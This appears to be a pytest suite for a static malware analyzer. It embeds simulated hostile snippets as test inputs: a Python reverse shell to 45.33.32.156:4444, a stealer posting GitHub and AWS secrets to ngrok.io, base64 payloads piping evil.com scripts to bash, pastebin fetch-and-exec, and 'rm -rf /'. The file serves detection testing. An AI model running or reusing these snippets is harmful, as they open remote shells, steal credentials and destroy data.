"""
Tests for Static Code Analyzer Module
"""

import pytest
from core.static_analyzer import StaticCodeAnalyzer


class TestStaticCodeAnalyzer:
    """Test suite for StaticCodeAnalyzer"""

    def setup_method(self):
        self.analyzer = StaticCodeAnalyzer()

    # ── CLEAN CODE ──

    def test_clean_python_code(self):
        """Clean Python code should have low risk"""
        code = '''
def hello(name):
    return f"Hello, {name}!"

def add(a, b):
    return a + b

result = add(1, 2)
print(hello("World"))
'''
        result = self.analyzer.scan(code, "clean.py", "python")
        assert result["risk_score"] < 20
        assert result["obfuscation_detected"] is False

    def test_clean_javascript_code(self):
        """Clean JS code should have low risk"""
        code = '''
function hello(name) {
    return "Hello, " + name;
}

const add = (a, b) => a + b;
console.log(hello("World"));
'''
        result = self.analyzer.scan(code, "clean.js", "javascript")
        assert result["risk_score"] < 20

    # ── EVAL / EXEC DETECTION ──

    def test_python_eval_detected(self):
        """Python eval() should be flagged"""
        code = '''
user_input = "2 + 2"
result = eval(user_input)
'''
        result = self.analyzer.scan(code, "test.py", "python")
        assert result["risk_score"] > 0
        assert any("eval" in issue["description"].lower()
                    for issue in result["issues"])

    def test_python_exec_detected(self):
        """Python exec() should be flagged"""
        code = '''
code_string = "print('hello')"
exec(code_string)
'''
        result = self.analyzer.scan(code, "test.py", "python")
        assert result["risk_score"] > 0
        assert any("exec" in issue["description"].lower()
                    for issue in result["issues"])

    def test_js_eval_detected(self):
        """JavaScript eval() should be flagged"""
        code = '''
var input = "alert(1)";
eval(input);
'''
        result = self.analyzer.scan(code, "test.js", "javascript")
        assert result["risk_score"] > 0

    # ── SUBPROCESS / CHILD_PROCESS ──

    def test_python_subprocess_detected(self):
        """Python subprocess usage should be flagged"""
        code = '''
import subprocess
subprocess.call(["ls", "-la"])
'''
        result = self.analyzer.scan(code, "test.py", "python")
        assert result["risk_score"] > 0
        assert any("subprocess" in issue["description"].lower()
                    for issue in result["issues"])

    def test_js_child_process_detected(self):
        """JavaScript child_process should be flagged"""
        code = '''
const { exec } = require("child_process");
exec("ls -la", (err, stdout) => {
    console.log(stdout);
});
'''
        result = self.analyzer.scan(code, "test.js", "javascript")
        assert result["risk_score"] > 0

    # ── BASE64 DETECTION ──

    def test_base64_payload_detected(self):
        """Base64 encoded strings should be detected"""
        code = '''
encoded = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCcpOw=="
import base64
exec(base64.b64decode(encoded))
'''
        result = self.analyzer.scan(code, "test.py", "python")
        assert len(result["encoded_payloads"]) > 0
        assert result["risk_score"] > 20

    # ── SUSPICIOUS URL DETECTION ──

    def test_suspicious_url_detected(self):
        """Suspicious URLs should be flagged"""
        code = '''
import requests
response = requests.get("https://pastebin.com/raw/abc123")
exec(response.text)
'''
        result = self.analyzer.scan(code, "test.py", "python")
        assert len(result["suspicious_urls"]) > 0

    # ── IP ADDRESS DETECTION ──

    def test_hardcoded_ip_detected(self):
        """Hardcoded external IPs should be detected"""
        code = '''
import socket
s = socket.socket()
s.connect(("45.33.32.156", 4444))
'''
        result = self.analyzer.scan(code, "test.py", "python")
        assert len(result["suspicious_ips"]) > 0

    def test_localhost_not_flagged(self):
        """Localhost should not be flagged"""
        code = '''
import socket
s = socket.socket()
s.connect(("127.0.0.1", 8080))
'''
        result = self.analyzer.scan(code, "test.py", "python")
        assert len(result["suspicious_ips"]) == 0

    # ── ENTROPY / OBFUSCATION ──

    def test_high_entropy_detected(self):
        """High entropy code should trigger obfuscation detection"""
        # Simulated obfuscated code
        # Base64-encoded string has entropy ~5.5-6.0
        import base64
        import os
        encoded = base64.b64encode(os.urandom(300)).decode()
        code = f'data = "{encoded}"'
        result = self.analyzer.scan(code, "test.py", "python")
        assert result["entropy_score"] > 4.0

    # ── EMPTY CODE ──

    def test_empty_code(self):
        """Empty code should return clean result"""
        result = self.analyzer.scan("", "empty.py", "python")
        assert result["risk_score"] == 0
        assert len(result["issues"]) == 0

    # ── DANGEROUS IMPORTS (AST) ──

    def test_os_import_detected(self):
        """Import os should be flagged"""
        code = '''
import os
os.system("rm -rf /")
'''
        result = self.analyzer.scan(code, "test.py", "python")
        assert len(result["dangerous_imports"]) > 0

    def test_socket_import_detected(self):
        """Import socket should be flagged"""
        code = '''
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
'''
        result = self.analyzer.scan(code, "test.py", "python")
        assert len(result["dangerous_imports"]) > 0


class TestMaliciousSamples:
    """Test with simulated malicious code samples"""

    def setup_method(self):
        self.analyzer = StaticCodeAnalyzer()

    def test_reverse_shell_python(self):
        """Simulated reverse shell should be high risk"""
        code = '''
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("45.33.32.156", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
'''
        result = self.analyzer.scan(code, "shell.py", "python")
        assert result["risk_score"] >= 50
        assert len(result["dangerous_imports"]) >= 2

    def test_credential_stealer(self):
        """Simulated credential stealer should be high risk"""
        code = '''
import os
import requests

token = os.environ.get("GITHUB_TOKEN")
aws_key = os.environ.get("AWS_SECRET_KEY")

data = {"token": token, "aws": aws_key}
requests.post("https://ngrok.io/steal", json=data)
'''
        result = self.analyzer.scan(code, "stealer.py", "python")
        assert result["risk_score"] >= 30
        assert len(result["suspicious_urls"]) > 0

    def test_encoded_payload_execution(self):
        """Encoded payload execution should be critical risk"""
        code = '''
import base64
payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tIHwgYmFzaCcpOw=="
exec(base64.b64decode(payload).decode())
'''
        result = self.analyzer.scan(code, "encoded.py", "python")
        assert result["risk_score"] >= 40
        assert len(result["encoded_payloads"]) > 0